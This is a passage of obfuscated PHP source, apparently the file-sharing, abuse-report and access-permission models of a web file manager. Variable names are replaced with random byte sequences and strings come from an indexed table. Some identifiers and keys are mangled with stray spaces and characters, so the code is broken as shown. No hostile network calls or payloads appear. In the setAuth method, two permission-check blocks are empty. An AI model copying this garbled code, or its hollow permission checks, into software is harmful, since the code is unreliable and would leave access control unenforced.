$§›–ÎÒ[1987]; } if ($´ä‡ü€[$§›–ÎÒ[502]] == $§›–ÎÒ[88] && $¾İÌµÚÔ[$§›–ÎÒ[502]] == $§›–ÎÒ[197]) { $Å¾¿³âÎ = $§›–ÎÒ[1990]; } if ($´ä‡ü€[$§›–ÎÒ[504]] == $§›–ÎÒ[197] && $¾İÌµÚÔ[$§›–ÎÒ[504]] == $§›–ÎÒ[88]) { $Å¾¿³âÎ = $§›–ÎÒ[1988]; } if ($´ä‡ü€[$§›–ÎÒ[504]] == $§›–ÎÒ[88] && $¾İÌµÚÔ[$§›–ÎÒ[504]] == $§›–ÎÒ[197]) { $Å¾¿³âÎ = $§›–ÎÒ[1991]; } Model($§›–ÎÒ[578])->eventShare($ü¶ƒŠ Ú, $Å¾¿³âÎ); return; } private function _addShareData($Éñ÷½”î, $± •èòƒ = array(), $øİ¥àø€ = false) { $ıßÉˆîİ =& $_SERVER[ Ö‘ñÄ”]; $«ÓûÇ¨™ = $øİ¥àø€ == $ıßÉˆîİ[1282] ? 0 : USER_ID; $¬¡®¤´È = array($ıßÉˆîİ[425] => $Éñ÷½”î, $ıßÉˆîİ[1654] => $«ÓûÇ¨™); if ($Éñ÷½”î == 0) { $¬¡®¤´È = array($ıßÉˆîİ[1992] => $± •èòƒ[$ıßÉˆîİ[1182]], $ıßÉˆîİ[1654] => $«ÓûÇ¨™); } if ($ú³÷Û»µ = $this->where($¬¡®¤´È)->find()) { return $ú³÷Û»µ[$ıßÉˆîİ[497]]; } if ($Éñ÷½”î == 0) { $¾Öóô² = array($ıßÉˆîİ[32] => get_path_this($± •èòƒ[$ıßÉˆîİ[84]])); } else { $¾Öóô² = Model($ıßÉˆîİ[838])->sourceInfo($Éñ÷½”î); if (!$¾Öóô²) { return !1; } } if (!$± •èòƒ[$ıßÉˆîİ[1562]]) { $± •èòƒ[$ıßÉˆîİ[1562]] = $¾Öóô²[$ıßÉˆîİ[32]]; } $ì¹‚ú = array($ıßÉˆîİ[1654] => $«ÓûÇ¨™, $ıßÉˆîİ[425] => $Éñ÷½”î, $ıßÉˆîİ[1562] => $ıßÉˆîİ[12], $ıßÉˆîİ[502] => 0, $ıßÉˆîİ[504] => 0, $ıßÉˆîİ[1182] => $ıßÉˆîİ[12], $ıßÉˆîİ[316] => $ıßÉˆîİ[12], $ıßÉˆîİ[895] => $ıßÉˆîİ[12], $ıßÉˆîİ[1993] => 0, $ıßÉˆîİ[1994] => 0, $ıßÉˆîİ[505] => 0, $ıßÉˆîİ[506] => $ıßÉˆîİ[12], $ıßÉˆîİ[499] => $ıßÉˆîİ[12]); $¹¾Ì½êœ = explode($ıßÉˆîİ[50], $ıßÉˆîİ[1995]); foreach ($¹¾Ì½êœ as $ã¦½ Ä¢) { if (!isset($± •èòƒ[$ã¦½ Ä¢])) { continue; } $ì¹‚ú[$ã¦½ Ä¢] = $± •èòƒ[$ã¦½ Ä¢]; } $¹Ñù½³• = $this->add($ì¹‚ú); $îÁõİ = array($ıßÉˆîİ[499] => short_id($¹Ñù½³•)); $this->where(array($ıßÉˆîİ[496] => $¹Ñù½³•))->save($îÁõİ); return $¹Ñù½³•; } private function _shareAuthSet($ï™ÕÆØ, $»»ìéê¡) { $Úì¡˜Áğ =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($»»ìéê¡)) { return !1; } $¨€Ò¡ªº = Model($Úì¡˜Áğ[1944]); $¨€Ò¡ªº->where(array($Úì¡˜Áğ[497] => $ï™ÕÆØ))->delete(); $œ¬ù½Ò = array(); foreach ($»»ìéê¡ as $§¿İĞ˜×) { $·áí§ºÆ = SourceModel::TYPE_USER; if ($§¿İĞ˜×[$Úì¡˜Áğ[419]] == SourceModel::TYPE_GROUP) { $·áí§ºÆ = SourceModel::TYPE_GROUP; } $â•£÷…¬ = array($Úì¡˜Áğ[497] => $ï™ÕÆØ, $Úì¡˜Áğ[419] => $·áí§ºÆ, $Úì¡˜Áğ[513] => intval($§¿İĞ˜×[$Úì¡˜Áğ[513]]), $Úì¡˜Áğ[1940] => 0, $Úì¡˜Áğ[1996] => -1); if ($§¿İĞ˜×[$Úì¡˜Áğ[1940]]) { $â•£÷…¬[$Úì¡˜Áğ[1940]] = $§¿İĞ˜×[$Úì¡˜Áğ[1940]]; } else { if ($§¿İĞ˜×[$Úì¡˜Áğ[1996]]) { $â•£÷…¬[$Úì¡˜Áğ[1996]] = $§¿İĞ˜×[$Úì¡˜Áğ[1996]]; } } $œ¬ù½Ò[] = $â•£÷…¬; } return $¨€Ò¡ªº->addAll($œ¬ù½Ò, array(), !0); } public function numViewAdd($¤†¦Æ¥) { $î½¾ëü” =& $_SERVER[ Ö‘ñÄ”]; $æøÌÂ = array($î½¾ëü”[496] => $¤†¦Æ¥); $this->where($æøÌÂ)->setAdd($î½¾ëü”[1993]); } public function numDownloadAdd($ší¼÷£¿) { $úÔö«” =& $_SERVER[ Ö‘ñÄ”]; $•˜Õäç³ = array($úÔö«”[496] => $ší¼÷£¿); $this->where($•˜Õäç³)->setAdd($úÔö«”[1994]); } protected function shareEdit($˜Æô¸ùŠ, $Ê·ï•â) { $õš×˜—Õ =& $_SERVER[ Ö‘ñÄ”]; $‡Á¤é™ = $this->getInfo($˜Æô¸ùŠ); if (!$‡Á¤é™) { return !1; } $this->_checkLinkShare($Ê·ï•â, $‡Á¤é™); $¡ûÕ™¥¨ = array(); $æ¯šƒÕÌ = explode($õš×˜—Õ[50], $õš×˜—Õ[1997]); foreach ($æ¯šƒÕÌ as $§»şíêÉ) { if (!array_key_exists($§»şíêÉ, $Ê·ï•â)) { continue; } $¡ûÕ™¥¨[$§»şíêÉ] = $Ê·ï•â[$§»şíêÉ]; } $this->shareEventAdd($‡Á¤é™[$õš×˜—Õ[410]], $Ê·ï•â, $õš×˜—Õ[1806]); $this->where(array($õš×˜—Õ[496] => $˜Æô¸ùŠ))->save($¡ûÕ™¥¨); if (isset($Ê·ï•â[$õš×˜—Õ[1986]])) { $this->_shareAuthSet($˜Æô¸ùŠ, $Ê·ï•â[$õš×˜—Õ[1986]]); } return !0; } private function _checkLinkShare($óÅËúÌ , $ƒÜ¶˜»Ô) { $ÔœÍâã =& $_SERVER[ Ö‘ñÄ”]; if ($óÅËúÌ [$ÔœÍâã[502]] != $ÔœÍâã[88]) { return; } $ß‚¢´¯ = $ƒÜ¶˜»Ô[$ÔœÍâã[86]][$ÔœÍâã[410]]; if ($ƒÜ¶˜»Ô[$ÔœÍâã[86]][$ÔœÍâã[33]] != $ÔœÍâã[199]) { $³¢„ëˆ¬ = $this->_folderReport($ß‚¢´¯); if (!$³¢„ëˆ¬) { return; } show_json(LNG($ÔœÍâã[1998]) . $ÔœÍâã[1999] . $³¢„ëˆ¬, !1); } $³á¥÷ôÂ = Model($ÔœÍâã[838])->fileInfoGet($ƒÜ¶˜»Ô[$ÔœÍâã[86]][$ÔœÍâã[410]]); if (!$³á¥÷ôÂ) { return; } $§ÉÆÅ‚ò = $this->shareFileMeta($³á¥÷ôÂ[$ÔœÍâã[476]]); if (isset($§ÉÆÅ‚ò[$ÔœÍâã[383]]) && $§ÉÆÅ‚ò[$ÔœÍâã[383]] == $ÔœÍâã[88]) { show_json(LNG($ÔœÍâã[2000]), !1); } } private function _folderReport($ÕäÂ Òå) { $§îÈˆª =& $_SERVER[ Ö‘ñÄ”]; $¼×˜¼µ« = array($§îÈˆª[476] => array($§îÈˆª[1018], 0), $§îÈˆª[763] => 3); $ˆû’óıÑ = Model($§îÈˆª[2001])->where($¼×˜¼µ«)->field($§îÈˆª[476])->select(); if (!$ˆû’óıÑ) { return !1; } $ˆû’óıÑ = array_to_keyvalue($ˆû’óıÑ, $§îÈˆª[12], $§îÈˆª[476]); $´¦½é¢› = $§îÈˆª[50] . $ÕäÂ Òå . $§îÈˆª[50]; $¼×˜¼µ« = array($§îÈˆª[476] => array($§îÈˆª[7], $ˆû’óıÑ), $§îÈˆª[529] => array($§îÈˆª[391], "\45{$´¦½é¢›}\45"), $§îÈˆª[439] => 0); $ã»€öÇ = Model($§îÈˆª[838])->where($¼×˜¼µ«)->field($§îÈˆª[2002])->find(); if (!$ã»€öÇ) { return !1; } $œ›æùŞû = substr($ã»€öÇ[$§îÈˆª[529]], strpos($ã»€öÇ[$§îÈˆª[529]], $´¦½é¢›)); $¼×˜¼µ« = array($§îÈˆª[410] => array($§îÈˆª[7], trim($œ›æùŞû, $§îÈˆª[50]))); $Ïùİ£ = Model($§îÈˆª[838])->where($¼×˜¼µ«)->field($§îÈˆª[32])->select(); $Ò›£·“ª = array_to_keyvalue($Ïùİ£, $§îÈˆª[12], $§îÈˆª[32]); $Ò›£·“ª[] = $ã»€öÇ[$§îÈˆª[32]]; return implode($§îÈˆª[8], $Ò›£·“ª); } protected function remove($åáŒÉ›ª) { $ù¾éĞ·½ =& $_SERVER[ Ö‘ñÄ”]; if (is_array($åáŒÉ›ª)) { $åáŒÉ›ª = array($ù¾éĞ·½[7], $åáŒÉ›ª); } $ŸøÙÓö = array($ù¾éĞ·½[497] => $åáŒÉ›ª); $´ãÂÔãÜ = $this->where($ŸøÙÓö)->delete(); if ($´ãÂÔãÜ) { Model($ù¾éĞ·½[610])->where(array($ù¾éĞ·½[497] => $åáŒÉ›ª))->delete(); } $«ãŸñ‚¥ = is_array($åáŒÉ›ª) ? $åáŒÉ›ª[1] : array($åáŒÉ›ª); for ($ì½©Öµº = 0; $ì½©Öµº < count($«ãŸñ‚¥); $ì½©Öµº++) { $âø¶ìäŞ = $this->getInfo($«ãŸñ‚¥[$ì½©Öµº]); if ($âø¶ìäŞ[$ù¾éĞ·½[504]] == $ù¾éĞ·½[88]) { Model($ù¾éĞ·½[578])->eventShare($âø¶ìäŞ[$ù¾éĞ·½[410]], $ù¾éĞ·½[1991]); } if ($âø¶ìäŞ[$ù¾éĞ·½[502]] == $ù¾éĞ·½[88]) { Model($ù¾éĞ·½[578])->eventShare($âø¶ìäŞ[$ù¾éĞ·½[410]], $ù¾éĞ·½[1990]); } } return $´ãÂÔãÜ; } protected function removeBySource($œÁ·ïı) { $¯§âÀ‡ =& $_SERVER[ Ö‘ñÄ”]; $Ğ¢‡ĞÈ = array($¯§âÀ‡[425] => array($¯§âÀ‡[426], $œÁ·ïı)); $éÆÕ½– = $this->field($¯§âÀ‡[497])->where($Ğ¢‡ĞÈ)->select(); $éÆÕ½– = array_to_keyvalue($éÆÕ½–, $¯§âÀ‡[12], $¯§âÀ‡[497]); if (!$éÆÕ½–) { return; } $Ğ¢‡ĞÈ = array($¯§âÀ‡[496] => array($¯§âÀ‡[426], $éÆÕ½–)); $this->where($Ğ¢‡ĞÈ)->delete(); Model($¯§âÀ‡[610])->where($Ğ¢‡ĞÈ)->delete(); } public function listAll($šÛÍÆ¬‘) { $ÍÍŞÑ×½ =& $_SERVER[ Ö‘ñÄ”]; $Ùş¦¢ôß = array(); if ($šÛÍÆ¬‘[$ÍÍŞÑ×½[1663]]) { $Ùş¦¢ôß[$ÍÍŞÑ×½[1663]] = $šÛÍÆ¬‘[$ÍÍŞÑ×½[1663]]; } if ($šÛÍÆ¬‘[$ÍÍŞÑ×½[774]]) { $É«†µé‡ = $šÛÍÆ¬‘[$ÍÍŞÑ×½[505]] ? $šÛÍÆ¬‘[$ÍÍŞÑ×½[505]] : strtotime(date($ÍÍŞÑ×½[2003])); $Ùş¦¢ôß[$ÍÍŞÑ×½[200]] = array($ÍÍŞÑ×½[342], array($šÛÍÆ¬‘[$ÍÍŞÑ×½[774]], $É«†µé‡)); } if ($šÛÍÆ¬‘[$ÍÍŞÑ×½[33]]) { $Ùş¦¢ôß[$šÛÍÆ¬‘[$ÍÍŞÑ×½[33]]] = 1; } else { $Ùş¦¢ôß[] = array($ÍÍŞÑ×½[502] => array($ÍÍŞÑ×½[1018], 0), $ÍÍŞÑ×½[504] => array($ÍÍŞÑ×½[1018], 0), $ÍÍŞÑ×½[1980] => $ÍÍŞÑ×½[1934]); } if ($šÛÍÆ¬‘[$ÍÍŞÑ×½[1930]]) { $Ùş¦¢ôß[] = array($ÍÍŞÑ×½[499] => $šÛÍÆ¬‘[$ÍÍŞÑ×½[1930]], $ÍÍŞÑ×½[1562] => array($ÍÍŞÑ×½[391], "\x25{$šÛÍÆ¬‘[$ÍÍŞÑ×½[1930]]}\45"), $ÍÍŞÑ×½[1980] => $ÍÍŞÑ×½[1934]); } $Œ¥®Âİ” = $this->_makeOrder()->where($Ùş¦¢ôß)->selectPage(20); if (empty($Œ¥®Âİ”[$ÍÍŞÑ×½[378]])) { return array(); } $this->_listDataApply($Œ¥®Âİ”[$ÍÍŞÑ×½[378]]); return $Œ¥®Âİ”; } public function listDataApply($Ÿ¥Õ´­) { $this->_listDataApply($Ÿ¥Õ´­); return $Ÿ¥Õ´­; } private function _listDataApply(&$€»Å²ñî) { $äëÑÛÓÚ =& $_SERVER[ Ö‘ñÄ”]; $¢Ë¼Ñ€Î = array_to_keyvalue($€»Å²ñî, $äëÑÛÓÚ[12], $äëÑÛÓÚ[1663]); $•†Ö³ = Model($äëÑÛÓÚ[543])->userListInfo(array_unique($¢Ë¼Ñ€Î)); $âå¦ï¡« = array_to_keyvalue($€»Å²ñî, $äëÑÛÓÚ[12], $äëÑÛÓÚ[410]); $æùá¦“° = Model($äëÑÛÓÚ[838])->sourceListInfo($âå¦ï¡«, !0); foreach ($€»Å²ñî as $çı’è½— => &$ú˜…³‰À) { $È¢é»™ = $ú˜…³‰À[$äëÑÛÓÚ[1663]]; $ú˜…³‰À[$äëÑÛÓÚ[2004]] = $•†Ö³[$È¢é»™] ? $•†Ö³[$È¢é»™] : !1; $·íĞ = $ú˜…³‰À[$äëÑÛÓÚ[410]]; $ú˜…³‰À[$äëÑÛÓÚ[86]] = $æùá¦“°[$·íĞ] ? $æùá¦“°[$·íĞ] : !1; if ($ú˜…³‰À[$äëÑÛÓÚ[86]][$äëÑÛÓÚ[439]] == $äëÑÛÓÚ[88]) { unset($€»Å²ñî[$çı’è½—]); } if ($ú˜…³‰À[$äëÑÛÓÚ[86]] != $äëÑÛÓÚ[197] && !$ú˜…³‰À[$äëÑÛÓÚ[86]]) { unset($€»Å²ñî[$çı’è½—]); } } unset($ú˜…³‰À); $€»Å²ñî = array_values($€»Å²ñî); } private function _makeOrder($¿Œ©¬ã = '') { $µ˜‚Œ¸ =& $_SERVER[ Ö‘ñÄ”]; $–Ô§¬¡¦ = array($µ˜‚Œ¸[200], $µ˜‚Œ¸[505], $µ˜‚Œ¸[1993], $µ˜‚Œ¸[1994]); $Œ‹¦ìî« = array($µ˜‚Œ¸[458] => $µ˜‚Œ¸[459], $µ˜‚Œ¸[460] => $µ˜‚Œ¸[461]); $ÒŞÆ½¶Ñ = Input::get($µ˜‚Œ¸[465], $µ˜‚Œ¸[7], $µ˜‚Œ¸[431], $–Ô§¬¡¦); $û œ‚öÄ = Input::get($µ˜‚Œ¸[466], $µ˜‚Œ¸[7], $µ˜‚Œ¸[2005], array($µ˜‚Œ¸[1927], $µ˜‚Œ¸[460])); $û œ‚öÄ = $Œ‹¦ìî«[$û œ‚öÄ]; $¿Œ©¬ã = $¿Œ©¬ã . "{$ÒŞÆ½¶Ñ}\x20{$û œ‚öÄ}"; return $this->order($¿Œ©¬ã); } public function reportAdd($¹ŸáĞí‹) { $ªÑ•Ïïş =& $_SERVER[ Ö‘ñÄ”]; $œĞ…‘Ä = array($ªÑ•Ïïş[497] => $¹ŸáĞí‹[$ªÑ•Ïïş[497]], $ªÑ•Ïïş[1663] => USER_ID); if (Model($ªÑ•Ïïş[2001])->where($œĞ…‘Ä)->find()) { return !1; } $¤€šÜ•‡ = array($ªÑ•Ïïş[497] => $¹ŸáĞí‹[$ªÑ•Ïïş[497]], $ªÑ•Ïïş[1562] => $¹ŸáĞí‹[$ªÑ•Ïïş[1562]], $ªÑ•Ïïş[410] => $¹ŸáĞí‹[$ªÑ•Ïïş[410]], $ªÑ•Ïïş[476] => $¹ŸáĞí‹[$ªÑ•Ïïş[476]], $ªÑ•Ïïş[1663] => USER_ID, $ªÑ•Ïïş[33] => $¹ŸáĞí‹[$ªÑ•Ïïş[33]], $ªÑ•Ïïş[461] => $¹ŸáĞí‹[$ªÑ•Ïïş[461]]); return Model($ªÑ•Ïïş[2001])->add($¤€šÜ•‡); } public function reportList($™ƒÎ„á¹) { $á™ÅÍƒÀ =& $_SERVER[ Ö‘ñÄ”]; $Š· Êœ¶ = array(); if ($™ƒÎ„á¹[$á™ÅÍƒÀ[774]]) { $Â¤’ÒáÖ = $™ƒÎ„á¹[$á™ÅÍƒÀ[505]] ? $™ƒÎ„á¹[$á™ÅÍƒÀ[505]] : strtotime(date($á™ÅÍƒÀ[2003])); $Š· Êœ¶[$á™ÅÍƒÀ[200]] = array($á™ÅÍƒÀ[342], array($™ƒÎ„á¹[$á™ÅÍƒÀ[774]], $Â¤’ÒáÖ)); } if (isset($™ƒÎ„á¹[$á™ÅÍƒÀ[33]]) && in_array($™ƒÎ„á¹[$á™ÅÍƒÀ[33]], array($á™ÅÍƒÀ[88], $á™ÅÍƒÀ[445], $á™ÅÍƒÀ[2006], $á™ÅÍƒÀ[2007], $á™ÅÍƒÀ[2008]))) { $Š· Êœ¶[$á™ÅÍƒÀ[33]] = $™ƒÎ„á¹[$á™ÅÍƒÀ[33]]; } if (isset($™ƒÎ„á¹[$á™ÅÍƒÀ[763]]) && in_array($™ƒÎ„á¹[$á™ÅÍƒÀ[763]], array($á™ÅÍƒÀ[197], $á™ÅÍƒÀ[88], $á™ÅÍƒÀ[445], $á™ÅÍƒÀ[2006]))) { $Š· Êœ¶[$á™ÅÍƒÀ[763]] = $™ƒÎ„á¹[$á™ÅÍƒÀ[763]]; } $î¥Ç”¬Ë = Input::get($á™ÅÍƒÀ[466], $á™ÅÍƒÀ[7], $á™ÅÍƒÀ[2005], array($á™ÅÍƒÀ[1927], $á™ÅÍƒÀ[460])); $ª´ıä´ä = array($á™ÅÍƒÀ[458] => $á™ÅÍƒÀ[459], $á™ÅÍƒÀ[460] => $á™ÅÍƒÀ[461]); $ùÌü¹– = $á™ÅÍƒÀ[2009] . $ª´ıä´ä[$î¥Ç”¬Ë]; $Ö„Ïè¯£ = Model($á™ÅÍƒÀ[2001])->where($Š· Êœ¶)->order($ùÌü¹–)->selectPage(20); if (empty($Ö„Ïè¯£[$á™ÅÍƒÀ[378]])) { return array(); } $İóÕšï = array_to_keyvalue_group($Ö„Ïè¯£[$á™ÅÍƒÀ[378]], $á™ÅÍƒÀ[763], $á™ÅÍƒÀ[497]); if (!empty($İóÕšï[0])) { $™ƒÎ„á¹ = $İóÕšï[0]; $Š· Êœ¶ = array($á™ÅÍƒÀ[497] => array($á™ÅÍƒÀ[7], $™ƒÎ„á¹)); $­ò§”Ğš = $this->where($Š· Êœ¶)->field($á™ÅÍƒÀ[497])->select(); $­ò§”Ğš = array_to_keyvalue($­ò§”Ğš, $á™ÅÍƒÀ[12], $á™ÅÍƒÀ[497]); $ËÑöôÛ = array_diff($™ƒÎ„á¹, $­ò§”Ğš); if (!empty($ËÑöôÛ)) { foreach ($Ö„Ïè¯£[$á™ÅÍƒÀ[378]] as $ê…òú˜¶ => $»Ñ‚ÎŸÈ) { if (in_array($»Ñ‚ÎŸÈ[$á™ÅÍƒÀ[497]], $ËÑöôÛ)) { unset($Ö„Ïè¯£[$á™ÅÍƒÀ[378]][$ê…òú˜¶]); } } } } $this->_listDataApply($Ö„Ïè¯£[$á™ÅÍƒÀ[378]]); return $Ö„Ïè¯£; } public function reportStatus($©ú…ç¿) { $¯ƒ³ˆï± =& $_SERVER[ Ö‘ñÄ”]; $ìğêŒ½û = array($¯ƒ³ˆï±[407] => $©ú…ç¿[$¯ƒ³ˆï±[407]]); $–²™¿»î = Model($¯ƒ³ˆï±[2001])->where($ìğêŒ½û)->field($¯ƒ³ˆï±[2010])->find(); if (!$–²™¿»î) { return !1; } $§ÀîæÊ = array($¯ƒ³ˆï±[763] => $©ú…ç¿[$¯ƒ³ˆï±[763]]); if ($©ú…ç¿[$¯ƒ³ˆï±[763]] == $¯ƒ³ˆï±[2006] && $–²™¿»î[$¯ƒ³ˆï±[763]] == $¯ƒ³ˆï±[2006]) { $§ÀîæÊ[$¯ƒ³ˆï±[763]] = 0; } $´êˆà‘ = Model($¯ƒ³ˆï±[2001])->where($ìğêŒ½û)->save($§ÀîæÊ); if ($©ú…ç¿[$¯ƒ³ˆï±[763]] == $¯ƒ³ˆï±[445]) { if ($–²™¿»î[$¯ƒ³ˆï±[476]] != $¯ƒ³ˆï±[197] && $this->shareFileMeta($–²™¿»î[$¯ƒ³ˆï±[476]])) { $this->shareFileMeta($–²™¿»î[$¯ƒ³ˆï±[476]], 0); } $this->remove($–²™¿»î[$¯ƒ³ˆï±[497]]); return !0; } if ($´êˆà‘ && $©ú…ç¿[$¯ƒ³ˆï±[763]] == $¯ƒ³ˆï±[2006]) { $œÓéŒÛŒ = $§ÀîæÊ[$¯ƒ³ˆï±[763]] == $¯ƒ³ˆï±[2006] ? 1 : 0; $this->shareFileMeta($–²™¿»î[$¯ƒ³ˆï±[476]], $œÓéŒÛŒ); $this->removeByFile($–²™¿»î[$¯ƒ³ˆï±[476]]); } return $´êˆà‘; } private function removeByFile($ê®¸Ö‘) { $«˜ÍÉÖƒ =& $_SERVER[ Ö‘ñÄ”]; $òÏÂİı– = Model($«˜ÍÉÖƒ[838])->where(array($«˜ÍÉÖƒ[476] => $ê®¸Ö‘))->field($«˜ÍÉÖƒ[410])->select(); $€ôóûÆ = array_to_keyvalue($òÏÂİı–, $«˜ÍÉÖƒ[12], $«˜ÍÉÖƒ[410]); $ŸÀƒ¶ = array($«˜ÍÉÖƒ[410] => array($«˜ÍÉÖƒ[7], $€ôóûÆ), $«˜ÍÉÖƒ[502] => 1); $òÏÂİı– = $this->where($ŸÀƒ¶)->field($«˜ÍÉÖƒ[497])->select(); if (empty($òÏÂİı–)) { return; } $Ãåû± Â = array_to_keyvalue($òÏÂİı–, $«˜ÍÉÖƒ[12], $«˜ÍÉÖƒ[497]); $this->remove($Ãåû± Â); } private function shareFileMeta($æÌ®Ãæ, $ÅÇ×ŸÈ = null) { $éæÉÊ¤õ =& $_SERVER[ Ö‘ñÄ”]; $íÌ“¨Ã = array($éæÉÊ¤õ[476] => $æÌ®Ãæ, $éæÉÊ¤õ[94] => $éæÉÊ¤õ[2011]); if (is_null($ÅÇ×ŸÈ)) { return Model($éæÉÊ¤õ[2012])->where($íÌ“¨Ã)->find(); } $íÌ“¨Ã[$éæÉÊ¤õ[383]] = $ÅÇ×ŸÈ; Model($éæÉÊ¤õ[2012])->add($íÌ“¨Ã, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\143\145\x5f\x61\165\x74\x68"; public function getAuth($ñ¯ÕÚÆÏ) { $Â©¬¸³ç =& $_SERVER[ Ö‘ñÄ”]; $šìƒ§¬¼ = $this->sourceAuthSelect($ñ¯ÕÚÆÏ); $®«á…˜« = array(); $éë­Ö¼œ = array(); $ûøÙ‰å = 2 << 25; foreach ($šìƒ§¬¼ as $šßÂ¡ë›) { $â¹¨ƒØ· = Model($Â©¬¸³ç[515])->listData($šßÂ¡ë›[$Â©¬¸³ç[1940]]); if (!$â¹¨ƒØ·) { continue; } $®«á…˜«[] = $šßÂ¡ë›; $ºŞ ¾î® = 0; if ($šßÂ¡ë›[$Â©¬¸³ç[419]] == SourceModel::TYPE_GROUP) { $ºŞ ¾î® = $ûøÙ‰å * 2; } if ($šßÂ¡ë›[$Â©¬¸³ç[419]] == SourceModel::TYPE_USER) { $ºŞ ¾î® = $ûøÙ‰å; } if ($šßÂ¡ë›[$Â©¬¸³ç[419]] == SourceModel::TYPE_USER && $šßÂ¡ë›[$Â©¬¸³ç[513]] == $Â©¬¸³ç[197]) { $ºŞ ¾î® = 0; } $éë­Ö¼œ[] = $â¹¨ƒØ·[$Â©¬¸³ç[421]] + $ºŞ ¾î®; } array_multisort($éë­Ö¼œ, SORT_DESC, $®«á…˜«); return $®«á…˜«; } public function sourceAuthSelect($ÅÙ£¾ò¬) { $¼½œŸ¢è =& $_SERVER[ Ö‘ñÄ”]; static $Ş®ö›Ÿ¥ = array(); $Òù¼Ì²ˆ = is_array($ÅÙ£¾ò¬) ? !1 : !0; if ($Òù¼Ì²ˆ) { $ÅÙ£¾ò¬ = array($ÅÙ£¾ò¬); } $õ ²ıòˆ = array(); foreach ($ÅÙ£¾ò¬ as $™›ğ­¢ì) { if (isset($Ş®ö›Ÿ¥[$™›ğ­¢ì])) { $õ ²ıòˆ[$™›ğ­¢ì] = $Ş®ö›Ÿ¥[$™›ğ­¢ì]; } } if (count($õ ²ıòˆ) == count($ÅÙ£¾ò¬)) { return $Òù¼Ì²ˆ ? $õ ²ıòˆ[$ÅÙ£¾ò¬[0]] : $õ ²ıòˆ; } $×ÚÕ— = $¼½œŸ¢è[2013]; $£¶÷·ª¨ = array($¼½œŸ¢è[410] => array($¼½œŸ¢è[7], $ÅÙ£¾ò¬)); $Ó´şÓàã = $this->field($×ÚÕ—)->order($¼½œŸ¢è[407])->where($£¶÷·ª¨)->select(); $ˆÉÛ—õ = array_to_keyvalue_group($Ó´şÓàã, $¼½œŸ¢è[410]); foreach ($ÅÙ£¾ò¬ as $™›ğ­¢ì) { $Ş®ö›Ÿ¥[$™›ğ­¢ì] = $ˆÉÛ—õ[$™›ğ­¢ì] ? $ˆÉÛ—õ[$™›ğ­¢ì] : array(); } if ($Òù¼Ì²ˆ) { return $Ó´şÓàã; } return $ˆÉÛ—õ; } public function setAuth($»Ñ§‡°¸, $ğğÒ‚Ä†) { $¢˜Äˆ¡‰ =& $_SERVER[ Ö‘ñÄ”]; $ì¼â„¸„ = Model($¢˜Äˆ¡‰[1333])->sourceInfo($»Ñ§‡°¸); if (!$ì¼â„¸„) { return !1; } if ($ì¼â„¸„[$¢˜Äˆ¡‰[419]] != SourceModel::TYPE_GROUP) { return !1; } $æ”ŒË¥Ö = 1; $ÇŒ×¦ç‡ = $ì¼â„¸„[$¢˜Äˆ¡‰[513]]; if ($ÇŒ×¦ç‡ != $æ”ŒË¥Ö) { $¤…£é»­ = array($¢˜Äˆ¡‰[1836] => $ÇŒ×¦ç‡); $œÌØøº = Model($¢˜Äˆ¡‰[1926])->field($¢˜Äˆ¡‰[1663])->where($¤…£é»­)->select(); $œÌØøº = array_to_keyvalue($œÌØøº, $¢˜Äˆ¡‰[12], $¢˜Äˆ¡‰[1663]); } $ˆ¼îÄ’† = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ø™Æá‡‹ = array(); foreach ($ğğÒ‚Ä† as $ıÑ­÷ûŞ) { if (!in_array($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[419]], $ˆ¼îÄ’†)) { show_json(LNG($¢˜Äˆ¡‰[2014]), !1); } if ($ÇŒ×¦ç‡ != $æ”ŒË¥Ö) { if ($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[419]] == SourceModel::TYPE_GROUP) { } if ($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[513]] != 0 && !in_array($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[513]], $œÌØøº)) { } } if ($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[513]] == 0) { $ıÑ­÷ûŞ[$¢˜Äˆ¡‰[419]] = SourceModel::TYPE_USER; } $ø™Æá‡‹[] = array($¢˜Äˆ¡‰[410] => $»Ñ§‡°¸, $¢˜Äˆ¡‰[419] => intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[419]]), $¢˜Äˆ¡‰[513] => intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[513]]), $¢˜Äˆ¡‰[1940] => intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[1940]]) ? intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[1940]]) : 0, $¢˜Äˆ¡‰[1996] => intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[1996]]) ? intval($ıÑ­÷ûŞ[$¢˜Äˆ¡‰[1996]]) : -1); } $this->where(array($¢˜Äˆ¡‰[425] => $»Ñ§‡°¸))->delete(); $this->addAll($ø™Æá‡‹); return !0; } public function authClear($–€×ëÇ¿) { $‡«Ô£Òá =& $_SERVER[ Ö‘ñÄ”]; $¯ºÁìƒ = Model($‡«Ô£Òá[1333])->sourceInfo($–€×ëÇ¿); $ôœ“ıøà = array($–€×ëÇ¿); if ($¯ºÁìƒ[$‡«Ô£Òá[418]] == $‡«Ô£Òá[88]) { $Óû£ç’ = array($‡«Ô£Òá[598] => array($‡«Ô£Òá[558], $¯ºÁìƒ[$‡«Ô£Òá[529]] . $–€×ëÇ¿ . $‡«Ô£Òá[559])); $ôœ“ıøà = Model($‡«Ô£Òá[1333])->field($‡«Ô£Òá[425])->where($Óû£ç’)->getField($‡«Ô£Òá[410], !0); $ôœ“ıøà[] = $–€×ëÇ¿; } $this->where(array($‡«Ô£Òá[425] => array($‡«Ô£Òá[426], $ôœ“ıøà)))->delete(); return !0; } public function getAllChildren($éüü±¢Ğ) { $µ‹İÊçØ =& $_SERVER[ Ö‘ñÄ”]; $³°¾ËğÔ = Model($µ‹İÊçØ[1333])->sourceInfo($éüü±¢Ğ); if ($³°¾ËğÔ[$µ‹İÊçØ[418]] != $µ‹İÊçØ[88]) { return $this->sourceListAuth(array($éüü±¢Ğ)); } if ($³°¾ËğÔ[$µ‹İÊçØ[419]] != SourceModel::TYPE_GROUP) { return array(); } $¨îî‹ì = 1; $‡­©Ö¹Î = array($éüü±¢Ğ); if ($³°¾ËğÔ[$µ‹İÊçØ[440]] == $µ‹İÊçØ[197] && 